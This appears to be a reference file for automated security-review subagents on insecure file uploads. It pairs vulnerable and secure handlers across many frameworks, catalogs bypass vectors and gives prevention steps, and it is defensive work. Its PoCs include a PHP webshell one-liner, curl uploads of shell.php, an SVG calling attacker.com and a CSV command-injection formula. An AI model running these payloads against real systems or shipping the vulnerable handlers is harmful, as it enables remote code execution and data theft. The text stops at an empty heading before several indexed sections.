---
subject: "Insecure file upload detection reference for SAST subagents: definition and exclusions, prevention patterns, per-stack vulnerable/secure recipes incl. FastAPI, 22-vector bypass catalog, prevention guidance, 8 modern watch-outs incl. multipart parser differentials, three-phase execution, OWASP and CWE mapping."
index:
  - anchor: fileupload-detection
    what: "Focused upload-security detection role using the three-phase subagent approach — recon, batched bypass verify, merge — gated on the architecture report."
    problem: "Codebase needs systematic sweep of every upload and file-processing endpoint, yet unstructured hunting misses validation gaps and drowns reviewers in unverified candidates; detection orchestration, phase pipeline, verified findings, audit rigor, methodical triage, candidate flood, coverage goal."
    use_when: "Upload scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-phase detection must run."
    avoid_when: "Architecture report missing — run analysis first; only conceptual upload knowledge is needed, not execution."
    expected: "Verified upload findings consolidated into the module report with false positives filtered."
  - anchor: fileupload-definition
    what: "Core definition: attacker-controlled file content, name, or type reaching storage or processing without validation, enabling webshells, traversal, and processor abuse; includes prevention-pattern overview."
    problem: "Reviewers disagree on what counts as upload insecurity without shared root causes, so content-type-only checks pass as safe while real validation gaps slip; concept baseline, shared vocabulary, classification consistency, definition anchor, validation layers, storage risk, term alignment."
    use_when: "Onboarding to the scan; deciding whether a file-handling path belongs to upload findings at all."
    avoid_when: "Concrete stack recipes are needed — jump to the examples anchor; execution workflow is the question."
    expected: "Everyone applies one definition: unvalidated files reaching storage or processors."
  - anchor: fileupload-examples
    what: "Per-stack vulnerable/secure recipe pairs: Flask, FastAPI, Django, Multer, PHP, Spring, Go, Rails, ASP.NET Core."
    problem: "Upload idioms differ per framework, and generic validation rules miss stack-specific traps like spooled temp files, multipart abstractions, and storage backends; stack recipes, framework handlers, storage apis, precise detection, pattern matching, call diversity, upload surface."
    use_when: "Target uses one of the covered stacks; reviewing upload handlers."
    avoid_when: "Bypass techniques are the question — see the catalog anchor; conceptual definitions wanted."
    expected: "Stack-specific unvalidated saves flagged; allowlist-guarded handlers verified."
  - anchor: fileupload-bypass-catalog
    what: "Twenty-two bypass vectors: extension gaps, MIME-only checks, blocklist holes, case tricks, double extensions, traversal, null bytes, polyglots, archive attacks, predictable names, processor SSRF, EXIF, client-side-only, CGI dirs, symlinks, object ACLs, metadata injection, CSV injection, relay abuse, and more."
    problem: "Classic-only review misses validation-bypass tricks that defeat well-placed checks entirely, from parser quirks to storage misconfiguration; vector inventory, filter evasion, polyglot files, zipslip, symlink tricks, metadata abuse, exotic paths, chain attacks."
    use_when: "A validation mechanism exists and its bypass surface needs enumeration; verify phase needs attack angles."
    avoid_when: "Basic upload analysis unfinished — cover the examples first; prevention guidance wanted."
    expected: "Every applicable bypass vector is tried before calling a validation scheme sound."
  - anchor: fileupload-prevention-guidance
    what: "Layered defense checklist: allowlists, magic-byte verification, generated filenames, outside-webroot storage, size limits, processing sandboxing, and access control on served files."
    problem: "Remediation advice scattered across guides leaves gaps that let one missed layer reopen webshell or traversal paths; remediation checklist, control mapping, defense completeness, gap elimination, hardening steps, storage isolation, systematic mitigation, closure guarantee."
    use_when: "Writing remediation; reviewing whether defenses are complete."
    avoid_when: "Detection mechanics are the question — see execution anchors."
    expected: "Every finding closes with a complete, layered control set."
  - anchor: fileupload-modern-bypasses
    what: "Eight modern watch-outs: presigned-URL abuse, GraphQL multipart, serverless handlers, image pipelines, WAF overtrust, filename injection, resumable uploads, multipart parser differentials."
    problem: "Classic-only review misses cloud-era and parser-differential tricks that bypass framework validation entirely during audits; presigned flows, graphql uploads, lambda handlers, waf gaps, chunked sessions, parser confusion, proxy chains, edge channels."
    use_when: "Standard validation review came back clean but suspicion remains; cloud storage or gateway chains present."
    avoid_when: "Basic upload analysis unfinished — cover the examples first; vector catalog wanted."
    expected: "Modern bypass paths are checked before declaring validation sound."
  - anchor: fileupload-execution
    what: "Three-phase execution: upload-site recon with a zero-candidate early-exit gate, batched bypass verify in groups of three, merge into the final module report."
    problem: "Detection work without orchestration duplicates effort, loses batch boundaries, and merges findings inconsistently; execution model, phase overview, subagent orchestration, context passing, batch discipline, workflow entry, staging, dispatch plan, consolidation, handoff clarity."
    use_when: "Starting the upload scan execution; dispatching or reviewing any phase."
    avoid_when: "Conceptual upload knowledge is the need — see definition and examples anchors."
    expected: "All three phases run with shared architecture context into one consolidated report."
  - anchor: fileupload-owasp-mapping
    what: "Mapping of upload findings to OWASP API 2023 risks, routed via API8 and API10."
    problem: "Findings need correct 2023-era taxonomy for reporting, and assuming dedicated upload categories mislabels everything downstream; taxonomy mapping, risk routing, classification accuracy, edition awareness, correct tagging, traceability, category shift, risk labels."
    use_when: "Tagging findings with OWASP 2023 risks; writing the report's risk section."
    avoid_when: "CWE-level tagging is the question — see the CWE anchor."
    expected: "Findings mapped to the correct risks with explicit reasoning."
  - anchor: fileupload-cwe-mapping
    what: "CWE table per upload weakness: unrestricted upload of dangerous type, path traversal, external control of filename, improper input validation."
    problem: "Wrong CWE assignment breaks downstream tooling and metrics, especially when storage and processing classes blur together across scanners; weakness taxonomy, cwe 434, misclassification risk, tooling accuracy, identifier precision, reporting feeds, scanner alignment."
    use_when: "Assigning CWE identifiers to findings."
    avoid_when: "OWASP risk framing is the question — see the OWASP anchor."
    expected: "Each finding carries the most specific CWE identifier."
  - anchor: fileupload-important-reminders
    what: "Closing operational reminders: phase ordering, batch discipline, validation-layer skepticism, and cleanup rules."
    problem: "Modules close with inconsistent final guidance, letting bypassable validations or weak proof slip into reports and client deliverables; closing rules, quality floor, consistency, final reminders, weak evidence, uniform endings, wrap discipline, audit closure."
    use_when: "Finalizing the module report; reviewing closing guidance."
    avoid_when: "Detection or execution is the current stage — finish those first."
    expected: "Reports close with uniform final rules applied."
  - anchor: fileupload-references
    what: "External link list for upload security concepts, cheat sheets, and tooling."
    problem: "Agents and readers need authoritative follow-up sources beyond this file's distilled content when deeper verification is required; further reading, external canon, deep dives, vendor documentation, community knowledge, primary material, cited works, owasp pages."
    use_when: "Primary sources or extended material is needed."
    avoid_when: "Detection recipes or execution workflow are the question — the references list is follow-up reading, not procedure."
    expected: "Reader reaches canonical external material for any topic this file condenses."
---

# Insecure File Upload Detection

[ref: #fileupload-detection]

You are performing a focused security assessment to find insecure file upload vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **discovery** (find all places where uploaded files are received and stored), **batched verify** (check bypass vectors in parallel batches of up to 3 upload sites each), and **merge** (consolidate batch reports into one results file).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

**Subagent constraint**: Subagents must **read-only** the codebase. They must **NEVER modify project source code**, configuration files, tests, or documentation. All findings are written only to the designated report files under `{{ REPORTS_ROOT }}/`.

***

## What is an Insecure File Upload
[ref: #fileupload-definition]

Insecure file upload occurs when an application accepts files from users without properly validating or restricting what can be uploaded, allowing an attacker to upload executable or malicious files. The most critical outcome is **Remote Code Execution (RCE)**: an attacker uploads a web shell (e.g., a `.php` file) and the server executes it when accessed via a direct URL.

The core pattern: *a user-supplied file reaches a storage location without adequate extension validation, and the stored file is accessible or executable.*

### What Insecure File Upload IS

- Accepting any file type with no extension or content check: `file.save(upload_path)` with no validation
- Content-Type-only validation: checking `Content-Type: image/png` without verifying the actual extension or file content — trivially bypassed by setting the header manually
- Extension blocklist with gaps: `.php` is blocked but `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.shtml` are not
- Case-insensitive bypass: blocking `.php` but allowing `.PHP`, `.Php`, `.pHp`
- Double extension bypass: `shell.php.jpg` — code extracts the last `.jpg` and considers it safe, but the server (Apache) serves it as PHP
- Path traversal in filenames: `../../webroot/shell.php` stored via an unsanitized filename
- Incomplete filename sanitization: only stripping `../` but not encoded variants `%2e%2e%2f`
- Serving uploaded files from a web-executable directory without disabling execution

### What Insecure File Upload is Not

Do not flag these as file upload vulnerabilities:

- **Stored XSS via SVG**: uploading an SVG with embedded `<script>` that is reflected back — that's XSS, not an upload execution issue
- **SSRF via file content**: uploading an XML or SVG that triggers an outbound request — that's XXE/SSRF, not a file upload execution issue
- **DoS via large files**: missing file size limits — a separate availability issue
- **IDOR on download**: accessing another user's uploaded file without authorization — that's IDOR
- **Secure uploads**: files stored outside the web root, or served through a controlled download endpoint that sets `Content-Disposition: attachment`, or stored in an object storage bucket with no public execution capability

### Patterns That Prevent Insecure File Upload

When you see these patterns together, the code is likely **not vulnerable**:

**1. Allowlist of safe extensions (most important)**
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
ext = filename.rsplit('.', 1)[-1].lower()
if ext not in ALLOWED_EXTENSIONS:
    abort(400)
```

**2. Magic byte / file content validation (defense in depth)**
```python
import magic
mime = magic.from_buffer(file.read(2048), mime=True)
ALLOWED_MIMES = {'image/png', 'image/jpeg', 'image/gif'}
if mime not in ALLOWED_MIMES:
    abort(400)
```

**3. Filename sanitization using a trusted library**
```python
from werkzeug.utils import secure_filename
filename = secure_filename(file.filename)  # strips path separators and dangerous chars
```

**4. Storing uploads outside the web root**
```
/var/uploads/  ← not served by the web server
/var/www/html/ ← web root (do NOT store uploads here)
```

**5. Serving uploads through a controlled endpoint with Content-Disposition**
```python
@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename,
                               as_attachment=True)  # forces download, prevents execution
```

**6. Renaming the file to a server-generated UUID**
```python
import uuid
stored_name = str(uuid.uuid4()) + '.jpg'  # extension is server-controlled, not user-controlled
```

***

## Vulnerable vs. Secure Examples
[ref: #fileupload-examples]

### Python — Flask

```python
# VULNERABLE: no extension check, file stored in web-accessible directory
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    f.save(os.path.join('static/uploads', f.filename))
    return 'uploaded'

# VULNERABLE: content-type only check (trivially bypassed with curl -H)
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    if f.content_type not in ['image/png', 'image/jpeg']:
        abort(400)
    f.save(os.path.join('static/uploads', f.filename))
    return 'uploaded'

# VULNERABLE: blocklist — .phtml/.phar/.php5 not covered
BLOCKED = {'.php', '.sh', '.exe'}
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    ext = os.path.splitext(f.filename)[1].lower()
    if ext in BLOCKED:
        abort(400)
    f.save(os.path.join('static/uploads', f.filename))
    return 'uploaded'

# SECURE: allowlist + sanitized filename + outside web root
ALLOWED = {'png', 'jpg', 'jpeg', 'gif'}
UPLOAD_FOLDER = '/var/uploads'  # outside web root

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    filename = secure_filename(f.filename)
    ext = filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED:
        abort(400)
    f.save(os.path.join(UPLOAD_FOLDER, filename))
    return 'uploaded'
```

### Python — FastAPI

```python
# VULNERABLE: UploadFile saved with no validation
from fastapi import FastAPI, UploadFile

app = FastAPI()

@app.post("/upload")
async def upload(file: UploadFile):
    with open(f"uploads/{file.filename}", "wb") as f:  # attacker-controlled name, type, content
        f.write(await file.read())
    return {"ok": True}

# SECURE: allowlist + magic-byte check + generated name + outside web root
import os
import uuid
from fastapi import HTTPException

ALLOWED = {".png", ".jpg", ".pdf"}
MAGIC = (b"\x89PNG", b"\xff\xd8\xff", b"%PDF")

@app.post("/upload")
async def upload(file: UploadFile):
    ext = os.path.splitext(file.filename or "")[1].lower()
    head = await file.read(8)
    if ext not in ALLOWED or not any(head.startswith(m) for m in MAGIC):
        raise HTTPException(status_code=400)
    await file.seek(0)
    dest = f"/var/uploads/{uuid.uuid4()}{ext}"  # generated name, outside web root
    with open(dest, "wb") as f:
        f.write(await file.read())
    return {"ok": True}
```

Note: `file.content_type` is client-supplied and proves nothing; enforce size limits at the server/proxy layer because `UploadFile` spools large bodies to disk.

### Python — Django

```python
# VULNERABLE: no validation on FileField
class DocumentForm(forms.ModelForm):
    class Meta:
        model = Document
        fields = ['upload']

# VULNERABLE: manual save with no extension check
def upload(request):
    f = request.FILES['file']
    with open(f'media/uploads/{f.name}', 'wb+') as dest:
        for chunk in f.chunks():
            dest.write(chunk)

# SECURE: custom validator on FileField
def validate_file_extension(value):
    ext = os.path.splitext(value.name)[1].lower()
    if ext not in ['.png', '.jpg', '.jpeg', '.gif']:
        raise ValidationError('Unsupported file extension.')

class DocumentForm(forms.ModelForm):
    upload = forms.FileField(validators=[validate_file_extension])
```

### Node.js — Multer (Express)

```javascript
// VULNERABLE: no file filter, stored in public directory
const upload = multer({ dest: 'public/uploads/' });
app.post('/upload', upload.single('file'), (req, res) => {
    res.send('uploaded');
});

// VULNERABLE: MIME type filter only (can be faked)
const upload = multer({
    dest: 'uploads/',
    fileFilter: (req, file, cb) => {
        if (!file.mimetype.startsWith('image/')) return cb(null, false);
        cb(null, true);
    }
});

// SECURE: allowlist of extensions + storage outside web root
const ALLOWED_EXT = ['.jpg', '.jpeg', '.png', '.gif'];
const storage = multer.diskStorage({
    destination: '/var/uploads',  // not served by Express
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase();
        cb(null, `${uuidv4()}${ext}`);
    }
});
const upload = multer({
    storage,
    fileFilter: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase();
        cb(null, ALLOWED_EXT.includes(ext));
    }
});
```

### PHP

```php
// VULNERABLE: no extension check, stored in web root
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// VULNERABLE: checking only content type header
if ($_FILES['file']['type'] !== 'image/jpeg') {
    die('Invalid file type');
}
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// VULNERABLE: blocklist missing phtml/phar
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$blocked = ['php', 'sh', 'py'];
if (in_array($ext, $blocked)) die('Blocked');
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// SECURE: allowlist + rename to UUID + outside web root
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die('Invalid extension');
$stored = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], $stored);
```

### Java — Spring Boot (MultipartFile)

```java
// VULNERABLE: no validation, stored in web-accessible path
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) throws IOException {
    Path path = Paths.get("src/main/resources/static/uploads/" + file.getOriginalFilename());
    Files.write(path, file.getBytes());
    return "uploaded";
}

// VULNERABLE: content type header only
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) throws IOException {
    if (!file.getContentType().startsWith("image/")) throw new BadRequestException();
    Files.write(Paths.get("uploads/" + file.getOriginalFilename()), file.getBytes());
    return "uploaded";
}

// SECURE: allowlist + UUID rename + path outside web root
private static final Set<String> ALLOWED = Set.of("jpg", "jpeg", "png", "gif");

@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) throws IOException {
    String original = StringUtils.cleanPath(file.getOriginalFilename());
    String ext = FilenameUtils.getExtension(original).toLowerCase();
    if (!ALLOWED.contains(ext)) throw new BadRequestException("Invalid extension");
    String stored = UUID.randomUUID() + "." + ext;
    Files.write(Paths.get("/var/uploads/" + stored), file.getBytes());
    return "uploaded";
}
```

### Go

```go
// VULNERABLE: no extension check, stored in static directory
func uploadHandler(w http.ResponseWriter, r *http.Request) {
    file, header, _ := r.FormFile("file")
    defer file.Close()
    dst, _ := os.Create("static/uploads/" + header.Filename)
    defer dst.Close()
    io.Copy(dst, file)
}

// SECURE: allowlist extension + UUID rename + outside web root
var allowed = map[string]bool{"jpg": true, "jpeg": true, "png": true, "gif": true}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
    file, header, _ := r.FormFile("file")
    defer file.Close()
    ext := strings.ToLower(filepath.Ext(header.Filename))
    if ext == "" || !allowed[ext[1:]] {
        http.Error(w, "invalid extension", http.StatusBadRequest)
        return
    }
    stored := "/var/uploads/" + uuid.New().String() + ext
    dst, _ := os.Create(stored)
    defer dst.Close()
    io.Copy(dst, file)
}
```

### Ruby on Rails

```ruby
# VULNERABLE: no content type or extension validation
def upload
  file = params[:file]
  File.open(Rails.root.join('public', 'uploads', file.original_filename), 'wb') do |f|
    f.write(file.read)
  end
end

# SECURE: ActiveStorage with content type allowlist (Rails 6+)
has_one_attached :avatar
validates :avatar, content_type: ['image/png', 'image/jpg', 'image/jpeg']
# Note: still validate extension too — content_type is user-supplied in some configurations

# SECURE: CarrierWave with extension and content type allowlist
class AvatarUploader < CarrierWave::Uploader::Base
  def extension_allowlist
    %w[jpg jpeg png gif]
  end

  def content_type_allowlist
    /image\//
  end
end
```

### C# — ASP.NET Core

```csharp
// VULNERABLE: no extension check, stored in wwwroot
[HttpPost]
public async Task<IActionResult> Upload(IFormFile file) {
    var path = Path.Combine("wwwroot/uploads", file.FileName);
    using var stream = new FileStream(path, FileMode.Create);
    await file.CopyToAsync(stream);
    return Ok();
}

// SECURE: allowlist + GUID rename + outside web root
private static readonly HashSet<string> _allowed = new() { ".jpg", ".jpeg", ".png", ".gif" };

[HttpPost]
public async Task<IActionResult> Upload(IFormFile file) {
    var ext = Path.GetExtension(file.FileName).ToLowerInvariant();
    if (!_allowed.Contains(ext)) return BadRequest("Invalid extension");
    var stored = Path.Combine("/var/uploads", $"{Guid.NewGuid()}{ext}");
    using var stream = new FileStream(stored, FileMode.Create);
    await file.CopyToAsync(stream);
    return Ok();
}
```

***

## Bypass Vector Catalog
[ref: #fileupload-bypass-catalog]

Use this catalog during Phase 2 to evaluate every upload site. Each vector includes detection guidance, a concrete code/logic example, and a dynamic-test PoC. These vectors apply regardless of language or framework.

### 1. No Extension Validation

**Detection**: The upload handler saves the file without checking `filename`, `content_type`, or bytes.

**Code example (vulnerable)**:
```python
f.save(os.path.join('static/uploads', f.filename))
```

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload \
  -F "file=@shell.php" \
  -L https://app.example.com/static/uploads/shell.php?cmd=id
```

**Classification**: **Vulnerable**.

### 2. Content-Type / MIME Header Only

**Detection**: Validation reads `Content-Type`, `mimetype`, or `file.content_type` from the request but never inspects the real filename extension or file bytes.

**Code example (vulnerable)**:
```python
if f.content_type not in ['image/png', 'image/jpeg']:
    abort(400)
f.save(os.path.join('static/uploads', f.filename))
```

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload \
  -F "file=@shell.php;type=image/png" \
  -L https://app.example.com/static/uploads/shell.php?cmd=id
```

**Classification**: **Vulnerable**.

### 3. Extension Blocklist with Gaps

**Detection**: An explicit list of forbidden extensions. Blocklists are almost always incomplete.

**Language-specific extensions to test**:
- **PHP**: `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.shtml`, `.htaccess`
- **Java**: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.war`
- **ASP.NET / IIS**: `.asp`, `.aspx`, `.ashx`, `.asmx`, `.cer`, `.asa`, `.config`
- **Python**: `.py`, `.pyw`, `.pyc`
- **Ruby**: `.rb`, `.erb`
- **Perl**: `.pl`, `.cgi`
- **Node.js**: `.js` may be executed if the server allows direct require/execution

**Code example (vulnerable)**:
```python
BLOCKED = {'.php', '.sh', '.exe'}
ext = os.path.splitext(f.filename)[1].lower()
if ext in BLOCKED:
    abort(400)
```

**Dynamic-test PoC**:
```bash
for ext in php3 phtml phar; do
  curl -X POST https://app.example.com/upload -F "file=@shell.${ext}"
done
```

**Classification**: **Likely Vulnerable** at minimum; **Vulnerable** if any dangerous extension is missing.

### 4. Case-Sensitivity Bypass

**Detection**: The check compares the extension against a lowercase string without lowercasing the input first.

**Code example (vulnerable)**:
```python
if ext == '.php': abort(400)  # ext may be '.PHP'
```

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload -F "file=@shell.PHP"
```

**Classification**: **Vulnerable** if the underlying filesystem or server is case-insensitive or case-preserving.

### 5. Double Extension / Multi-Extension

**Detection**: The code extracts the extension after the last dot (`shell.php.jpg` → `.jpg`) but the server (e.g., Apache with `AddHandler application/x-httpd-php .php`) executes based on the first recognized extension.

**Code example (vulnerable)**:
```python
ext = filename.rsplit('.', 1)[-1]  # last extension only
```

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload -F "file=@shell.php.jpg"
# Then access /uploads/shell.php.jpg?cmd=id on Apache with PHP handler
```

**Classification**: **Likely Vulnerable** if the server configuration is unknown; **Vulnerable** if the recon file notes Apache/PHP or similar.

### 6. Path Traversal in Filename

**Detection**: The original filename is used in the storage path without sanitization. Look for direct use of `f.filename`, `header.Filename`, `file.getOriginalFilename()`, or `$_FILES['name']` inside path joins.

**Code example (vulnerable)**:
```python
f.save(os.path.join('uploads', f.filename))
```

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload \
  -F "file=@shell.php;filename=../../webroot/shell.php"
```

**Classification**: **Vulnerable** when traversal is possible.

### 7. Null-Byte Truncation

**Detection**: Older runtimes or libraries stop parsing a filename at a null byte (`\x00` or `%00`). A check on `shell.jpg%00.php` sees `.jpg`, but the OS or library may write `shell.jpg` and ignore the rest, or vice versa depending on the parser.

**Code example (vulnerable)**:
```python
# Python 2 / C-style string handling
ext = filename.split('\x00')[0].rsplit('.', 1)[-1]
```

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload \
  -F "file=@shell.php;filename=shell.jpg%00.php"
```

**Classification**: **Vulnerable** if null bytes are accepted and the runtime is susceptible.

### 8. Polyglot Files

**Detection**: A file is valid under multiple parsers (e.g., a valid GIF/PNG/JPG that also contains PHP code). Magic-byte checks may pass, but the server may still execute embedded script if extension validation is bypassed or the parser runs the file.

**Code example (vulnerable context)**:
```python
# Allowlist only checks magic bytes; file extension later derived from filename
mime = magic.from_buffer(file.read(2048), mime=True)
if mime in {'image/png'}:
    f.save('uploads/' + f.filename)  # filename could be shell.php
```

**Dynamic-test PoC**:
```bash
# Create a PNG that is also valid PHP
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
curl -X POST https://app.example.com/upload -F "file=@shell.png.php"
```

**Classification**: Contributing weakness; flag as **Likely Vulnerable** when combined with extension derivation from the filename or executable storage.

### 9. Archive Bombs and ZipSlip

**Detection**: The application accepts ZIP, TAR, RAR, 7z, or other archives and extracts them without validating entry paths, sizes, or compression ratios.

**ZipSlip code example (vulnerable)**:
```python
import zipfile
with zipfile.ZipFile(uploaded_zip) as z:
    z.extractall('uploads/')  # entries like ../../etc/cron.d/evil pass through
```

**Archive bomb detection**: No limit on total uncompressed size, number of entries, or compression ratio.

**Dynamic-test PoC**:
```bash
# ZipSlip: create archive with traversal entry
zip zipslip.zip ../../tmp/zipslip_evidence.txt
# Upload and verify file lands outside uploads/
```

**Classification**: **Vulnerable** if path traversal is possible during extraction; **Likely Vulnerable** if resource limits are missing.

### 10. Predictable or User-Controlled Filenames

**Detection**: The stored filename is derived from user input, an incrementing integer, or a timestamp without sufficient entropy. Attackers can predict URLs to overwrite files or access others' uploads.

**Code example (vulnerable)**:
```python
filename = f"{user_id}_{f.filename}"
```

**Dynamic-test PoC**:
```bash
# Guess another user's upload URL
curl -I https://app.example.com/uploads/42_avatar.jpg
curl -I https://app.example.com/uploads/43_avatar.jpg
```

**Classification**: **Likely Vulnerable** (often overlaps with IDOR, but the upload mechanism enables it).

### 11. SSRF via Image / Document Processors

**Detection**: Uploaded files are processed by ImageMagick, LibreOffice, ffmpeg, document-to-PDF converters, or other tools that fetch external resources (fonts, images, XPS, DTDs, video streams).

**Code example (vulnerable context)**:
```python
# ImageMagick processes uploaded SVG
subprocess.run(['convert', uploaded_svg, 'output.png'])
```

**Dynamic-test PoC**:
```xml
<!-- upload.svg -->
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <image href="http://attacker.com/ssrf" />
</svg>
```

**Classification**: Not a file-upload RCE issue in itself, but flag as **Needs Manual Review** or cross-reference with the SSRF skill if the upload triggers outbound requests.

### 12. EXIF / Metadata Injection

**Detection**: EXIF data or other metadata is later rendered unsanitized, leading to XSS, HTML injection, or command injection in downstream tools.

**Dynamic-test PoC**:
```bash
exiftool -Comment='<script>alert(1)</script>' shell.jpg
curl -X POST https://app.example.com/upload -F "file=@shell.jpg"
```

**Classification**: Cross-reference with XSS skill; note as upload-related metadata risk.

### 13. Client-Side Validation Bypass

**Detection**: Validation exists only in JavaScript, HTML `accept` attribute, or mobile app code. The server accepts the file regardless.

**Dynamic-test PoC**:
```bash
curl -X POST https://app.example.com/upload -F "file=@shell.php"
```

**Classification**: **Vulnerable** if the server lacks equivalent validation.

### 14. CGI-Executable Directories

**Detection**: Uploads are placed in a directory configured to execute scripts via CGI, FastCGI, PHP-FPM, or similar handlers.

**Code example (vulnerable context)**:
```nginx
location /uploads/ {
    # Nginx passes .php files to PHP-FPM
    try_files $uri =404;
    fastcgi_pass 127.0.0.1:9000;
}
```

**Classification**: **Vulnerable** if any script extension can reach that directory.

### 15. Symlink Attacks

**Detection**: The application moves, copies, or extracts files and follows symbolic links, allowing an attacker to write to arbitrary filesystem locations.

**Code example (vulnerable context)**:
```python
shutil.copy(tmp_path, final_path)  # follows symlinks
```

**Classification**: **Vulnerable** if symlinks are honored during file operations.

### 16. Object-Storage Public-Read ACLs

**Detection**: Uploads are sent to S3, GCS, Azure Blob, or MinIO with a public-read ACL or bucket policy, making every uploaded file publicly accessible.

**Code example (vulnerable)**:
```python
s3.put_object(Bucket='uploads', Key=name, Body=data, ACL='public-read')
```

**Dynamic-test PoC**:
```bash
aws s3 ls s3://uploads-bucket/ --no-sign-request
```

**Classification**: **Likely Vulnerable**; also relevant to privacy / sensitive-data exposure.

### 17. NoSQL / JSON Metadata Injection

**Detection**: File metadata (filename, content_type, EXIF, custom tags) is stored in a NoSQL database or parsed as JSON/XML without sanitization.

**Code example (vulnerable)**:
```python
db.files.insert_one({"filename": filename, "owner": user_id})  # filename may contain $ne
```

**Classification**: Cross-reference with injection skills; flag as **Likely Vulnerable** if metadata is used in queries.

### 18. CSV Injection

**Detection**: Uploaded CSV/Excel files are later opened by spreadsheet applications. Formulas beginning with `=`, `+`, `-`, `@` may execute.

**Dynamic-test PoC**:
```csv
=cmd|'/C calc'!A0
```

**Classification**: Note as data-integrity / client-side risk linked to upload.

### 19. Uploads Relayed to SMTP / Message Queues

**Detection**: The application forwards uploaded files or their metadata to email services (SMTP), message queues (RabbitMQ, SQS), or webhooks without re-validation. Malicious filenames or content can poison downstream consumers.

**Code example (vulnerable context)**:
```python
send_email(
    to=user_email,
    subject=f"New file: {f.filename}",  # header injection if unescaped
    attachment=f
)
```

**Classification**: **Likely Vulnerable** if downstream trust assumptions are not verified.

### 20. Race Conditions (Time-of-Check to Time-of-Use)

**Detection**: The file is validated, then moved/saved in a separate step. Between validation and storage the file can be swapped, symlinked, or overwritten.

**Code example (vulnerable)**:
```python
if validate(f):
    # Attacker swaps tmp file here
    shutil.move(f.temporary_file_path(), final_path)
```

**Classification**: **Likely Vulnerable** when validation and storage are not atomic.

### 21. Double-URL / Unicode Normalization Bypass

**Detection**: The application decodes or normalizes the filename twice, collapsing sequences like `%252e%252e%252f` into `../`, or strips Unicode homoglyphs inconsistently.

**Classification**: **Vulnerable** if normalization leads to traversal or execution.

### 22. Upload to Log / Config Directories

**Detection**: The destination path is user-influenced and can point to `.ssh/authorized_keys`, cron directories, or application config paths.

**Classification**: **Vulnerable** when arbitrary write locations are reachable.

***

## How to Prevent
[ref: #fileupload-prevention-guidance]

Apply the following controls together. No single control is sufficient.

### 1. Extension Allowlist (Not Blocklist)

- Define the smallest set of extensions the business actually needs.
- Apply the check case-insensitively.
- Derive the extension after sanitizing the filename, not before.

```python
ALLOWED = {'png', 'jpg', 'jpeg', 'gif'}
ext = secure_filename(filename).rsplit('.', 1)[-1].lower()
if ext not in ALLOWED:
    abort(400)
```

### 2. Magic-Byte / File-Signature Validation

- Verify the file signature (magic bytes) matches the allowlisted extension.
- Reject files where the declared extension and actual signature disagree.
- Do not rely on the client-provided `Content-Type`.

### 3. File-Size and Count Limits

- Enforce maximum file size, maximum number of files per request, and total request size at the reverse proxy / WAF / framework level.
- Enforce limits on post-processing resources (image dimensions, thumbnail count, video duration).

### 4. Server-Generated Filename

- Rename the file to a UUID or other cryptographically random value.
- Keep the extension only if it was allowlisted and sanitized; never trust the original extension.

```python
stored = f"{uuid.uuid4()}.{ext}"
```

### 5. Store Uploads Outside the Web Root

- Never place uploads in `static/`, `public/`, `wwwroot/`, or any directory the web server can execute.
- Use a dedicated volume with no script handler mapped.

### 6. Serve Through a Controlled Download Endpoint

- Use a controller that sets `Content-Disposition: attachment`.
- Do not serve user-provided filenames directly; map the internal UUID to the original name only at download time.

```python
return send_from_directory(UPLOAD_FOLDER, stored_name,
                           as_attachment=True,
                           download_name=original_name)
```

### 7. Disable Script Execution in Storage Directories

- **Apache**: `.htaccess` with `php_flag engine off` or `RemoveHandler .php`.
- **Nginx**: `location /uploads/ { location ~* \.php$ { return 403; } }`.
- **IIS**: Request Filtering rules to deny script extensions.

### 8. Set Security Headers on Downloaded Content

- `X-Content-Type-Options: nosniff` prevents MIME-sniffing attacks.
- `Content-Disposition: attachment` prevents inline rendering.
- Use a separate origin or sandbox domain for user content.

### 9. AV / Anti-Malware Scanning

- Scan every upload with an up-to-date AV engine or sandboxed malware-analysis service.
- Quarantine or delete files that fail the scan before they reach storage.

### 10. Sandbox Third-Party Processing

- Run ImageMagick, ffmpeg, LibreOffice, OCR, PDF converters, and other tools in isolated containers with no network access and strict resource limits.
- Treat output from these tools as untrusted input.

### 11. Validate Archives Before Extraction

